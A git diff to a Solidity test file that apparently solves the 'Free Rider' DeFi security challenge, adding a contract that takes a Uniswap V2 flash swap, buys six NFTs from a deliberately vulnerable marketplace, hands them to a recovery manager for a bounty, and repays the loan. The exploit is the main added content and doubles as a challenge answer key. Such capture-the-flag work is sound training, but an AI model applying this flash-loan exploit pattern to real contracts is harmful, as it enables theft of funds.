@@ -58,7 +58,9 @@ contract FreeRiderChallenge is Test {
         weth = new WETH();
 
         // Deploy Uniswap V2 Factory and Router
-        uniswapV2Factory = IUniswapV2Factory(deployCode("builds/uniswap/UniswapV2Factory.json", abi.encode(address(0))));
+        uniswapV2Factory = IUniswapV2Factory(
+            deployCode("builds/uniswap/UniswapV2Factory.json", abi.encode(address(0)))
+        );
         uniswapV2Router = IUniswapV2Router02(
             deployCode("builds/uniswap/UniswapV2Router02.json", abi.encode(address(uniswapV2Factory), address(weth)))
         );
@@ -94,8 +96,12 @@ contract FreeRiderChallenge is Test {
         marketplace.offerMany(ids, prices);
 
         // Deploy recovery manager contract, adding the player as the beneficiary
-        recoveryManager =
-            new FreeRiderRecoveryManager{value: BOUNTY}(player, address(nft), recoveryManagerOwner, BOUNTY);
+        recoveryManager = new FreeRiderRecoveryManager{value: BOUNTY}(
+            player,
+            address(nft),
+            recoveryManagerOwner,
+            BOUNTY
+        );
 
         vm.stopPrank();
     }
@@ -123,7 +129,10 @@ contract FreeRiderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_freeRider() public checkSolvedByPlayer {
-        
+        Recover recover = new Recover(marketplace, recoveryManager, uniswapPair, weth);
+        bytes memory data = abi.encode(address(player));
+
+        uniswapPair.swap((NFT_PRICE * 6), 0, address(recover), data);
     }
 
     /**
@@ -144,5 +153,53 @@ contract FreeRiderChallenge is Test {
         // Player must have earned all ETH
         assertGt(player.balance, BOUNTY);
         assertEq(address(recoveryManager).balance, 0);
+    }
+}
+
+contract Recover {
+    FreeRiderNFTMarketplace marketplace;
+    FreeRiderRecoveryManager recoveryManager;
+    IUniswapV2Pair uniswapPair;
+    WETH weth;
+
+    constructor(
+        FreeRiderNFTMarketplace _marketplace,
+        FreeRiderRecoveryManager _recoveryManager,
+        IUniswapV2Pair _uniswapPair,
+        WETH _weth
+    ) {
+        marketplace = _marketplace;
+        recoveryManager = _recoveryManager;
+        uniswapPair = _uniswapPair;
+        weth = _weth;
+    }
+
+    receive() external payable {}
+
+    function uniswapV2Call(address, uint amount0, uint, bytes calldata data) external {
+        weth.withdraw(amount0);
+
+        uint256[] memory tokenIds = new uint256[](6);
+        for (uint256 i = 0; i < tokenIds.length; ++i) {
+            tokenIds[i] = i;
+        }
+
+        marketplace.buyMany{value: 15 ether}(tokenIds);
+
+        for (uint256 i = 0; i < tokenIds.length; ++i) {
+            marketplace.token().safeTransferFrom(address(this), address(recoveryManager), i, data);
+        }
+
+        uint amount0Repay = (amount0 * 1004) / 1000;
+        weth.deposit{value: amount0Repay}();
+        weth.transfer(address(uniswapPair), amount0Repay);
+    }
+
+    function onERC721Received(address, address, uint256, bytes memory) external pure returns (bytes4) {
+        // Becuase of vulnerability in FreeRiderNFTMarketplace:L108, I cannot transfer the NFT to FreeRiderRecoveryManager in this call.
+        // FreeRiderRecoveryManager has no fallback function and cannot receive the ETH.
+
+        // marketplace.token().safeTransferFrom(address(this), address(recoveryManager), _tokenId, data);
+        return this.onERC721Received.selector;
     }
 }
